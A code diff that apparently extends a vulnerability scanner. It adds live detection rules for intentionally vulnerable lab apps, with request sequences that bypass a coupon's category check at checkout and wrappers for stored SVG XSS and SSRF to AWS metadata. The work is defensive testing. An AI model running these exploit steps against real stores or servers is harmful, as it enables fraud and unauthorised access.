@@ -26220,24 +26220,35 @@ async function pwnshopMailInboxToken(ctx: RuleContext, cookie: string): Promise<
   return pwnshopMailTokenFromRedirect(doc.headers["location"] || "");
 }
 
+function pwnshopSleep(ms: number): Promise<void> {
+  return new Promise((resolve) => setTimeout(resolve, ms));
+}
+
 async function pwnshopOtpFromMailInbox(
   ctx: RuleContext,
   cookie: string,
   inboxToken: string
 ): Promise<string | null> {
   const mailUrl = new URL(`/mail/${inboxToken}`, ctx.origin).toString();
-  const doc = await ctx.probe.get(mailUrl, {
-    maxBytes: 16384,
-    timeoutMs: 15000,
-    headers: { Cookie: cookie }
-  });
-  if (doc.status < 200 || doc.status >= 400) return null;
-  return pwnshopOtpFromMailBody(doc.body);
+  // OTP mail can arrive after login redirect — poll with fetchDoc (bypasses probe cache on retries).
+  for (let attempt = 0; attempt < 6; attempt++) {
+    if (attempt > 0) await pwnshopSleep(1200);
+    const doc = await fetchDoc(mailUrl, {
+      maxBytes: 65536,
+      timeoutMs: 15000,
+      headers: { Cookie: cookie }
+    });
+    if (doc.status < 200 || doc.status >= 400) continue;
+    const otp = pwnshopOtpFromMailBody(doc.body);
+    if (otp) return otp;
+  }
+  return null;
 }
 
 async function pwnshopCompleteOtpSession(ctx: RuleContext): Promise<string | null> {
   const cookie = await pwnshopRegisterAndLoginCookie(ctx);
   if (!cookie) return null;
+  await pwnshopSleep(600);
   const inboxToken = await pwnshopMailInboxToken(ctx, cookie);
   if (!inboxToken) return null;
   const otp = await pwnshopOtpFromMailInbox(ctx, cookie, inboxToken);
@@ -26384,6 +26395,105 @@ const pwnshopApplyCouponLiveOracle: Rule = async (ctx) => {
       code: "HALFOFF",
       snippet: couponDoc.body.slice(0, 200).trim(),
       note: "Pwnshop POST /apply-coupon accepts HALFOFF after OTP login and returns valid:true with 50% discount — authenticated coupon application oracle (PWN-016 family)"
+    }
+  };
+};
+
+const pwnshopCouponCategoryBypassLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const cookie = await pwnshopCompleteOtpSession(ctx);
+  if (!cookie) return NEGATIVE;
+  const fashionProductId = "4";
+  const addFashionUrl = new URL("/cart/add", ctx.origin).toString();
+  await ctx.probe.get(addFashionUrl, {
+    method: "POST",
+    body: `product_id=${fashionProductId}&quantity=1`,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: cookie
+    },
+    maxBytes: 2048,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  await pwnshopSleep(400);
+  const applyUrl = new URL("/apply-coupon", ctx.origin).toString();
+  const applyDoc = await ctx.probe.get(applyUrl, {
+    method: "POST",
+    body: "code=PHONE20&cart_total=19000",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: cookie
+    },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (!/"valid"\s*:\s*false/i.test(applyDoc.body)) return NEGATIVE;
+  if (!/only valid for phones/i.test(applyDoc.body)) return NEGATIVE;
+  const checkoutUrl = new URL("/checkout", ctx.origin).toString();
+  const checkoutDoc = await ctx.probe.get(checkoutUrl, {
+    method: "POST",
+    body: `shipping_address=Thugir+probe+address&payment_method=wallet&coupon_code=PHONE20`,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: cookie
+    },
+    maxBytes: 65536,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  if (checkoutDoc.status < 200 || checkoutDoc.status >= 500) return NEGATIVE;
+  if (/only valid for phones/i.test(checkoutDoc.body)) return NEGATIVE;
+  const location = checkoutDoc.headers["location"] || "";
+  const orderOk = /\/order\/\d+/i.test(location) || /\/track/i.test(location);
+  const walletInsufficient =
+    /Insufficient wallet balance/i.test(checkoutDoc.body) ||
+    /Insufficient Balance/i.test(checkoutDoc.body);
+  if (!orderOk && !walletInsufficient) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: orderOk ? 0.94 : 0.91,
+    evidence: {
+      applyUrl,
+      applySnippet: applyDoc.body.slice(0, 160).trim(),
+      checkoutUrl,
+      checkoutLocation: location || undefined,
+      walletInsufficient,
+      note: "Pwnshop PHONE20 rejected at /apply-coupon for fashion cart but checkout accepts coupon_code=PHONE20 without category re-validation — coupon category bypass (PWN-016)"
+    }
+  };
+};
+
+const pwnshopAvatarUploadRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/profile\/upload-avatar/i.test(pageUrl)) return NEGATIVE;
+  const result = await pwnshopAvatarSvgXssLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Pwnshop /profile/upload-avatar route scan — POST stores SVG with onload handler served at /uploads/ — stored XSS via avatar upload (PWN-012)"
+    }
+  };
+};
+
+const pwnshopApplyCouponRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/apply-coupon/i.test(pageUrl)) return NEGATIVE;
+  const result = await pwnshopApplyCouponLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Pwnshop /apply-coupon route scan — POST accepts HALFOFF after OTP login with valid:true and 50% discount (PWN-016 family)"
     }
   };
 };
@@ -30967,6 +31077,58 @@ const ssrfVulnlabRedirectLiveOracle: Rule = async (ctx) => {
       snippet: body.slice(0, 240).trim(),
       note: "ssrf.vulnlab.dev GET /redirect/?url=https://ssrf.vulnlab.dev/r/?to=<internal> passes vulnlab.dev host allow-list then follows redirect to AWS metadata — follow-redirect SSRF oracle"
     }
+  };
+};
+
+const ssrfVulnlabBasicRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/basic\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await ssrfVulnlabBasicLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const ssrfVulnlabMetadataAwsRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/metadata(?:-aws)?\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await ssrfVulnlabMetadataAwsLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const ssrfVulnlabBlocklistRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/blocklist\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await ssrfVulnlabBlocklistBypassLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const ssrfVulnlabRedirectRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/redirect\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await ssrfVulnlabRedirectLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
   };
 };
 
@@ -36754,6 +36916,9 @@ export const RULES: Record<string, Rule> = {
   pwnshopMailInboxIdorLiveOracle,
   pwnshopAvatarSvgXssLiveOracle,
   pwnshopApplyCouponLiveOracle,
+  pwnshopCouponCategoryBypassLiveOracle,
+  pwnshopAvatarUploadRouteLiveOracle,
+  pwnshopApplyCouponRouteLiveOracle,
   brokencrystalsUserloginCssInjectionLiveOracle,
   clientSideVulnforgeAcademyEvidence,
   clientSideVulnforgeEvidence,
@@ -36881,6 +37046,10 @@ export const RULES: Record<string, Rule> = {
   ssrfVulnlabMetadataAwsLiveOracle,
   ssrfVulnlabBlocklistBypassLiveOracle,
   ssrfVulnlabRedirectLiveOracle,
+  ssrfVulnlabBasicRouteLiveOracle,
+  ssrfVulnlabMetadataAwsRouteLiveOracle,
+  ssrfVulnlabBlocklistRouteLiveOracle,
+  ssrfVulnlabRedirectRouteLiveOracle,
   wrongsecretsChallengeLiveOracle,
   clientSideVulnlabApiLabsEvidence,
   clientSideVulnlabCmsPlatformEvidence,
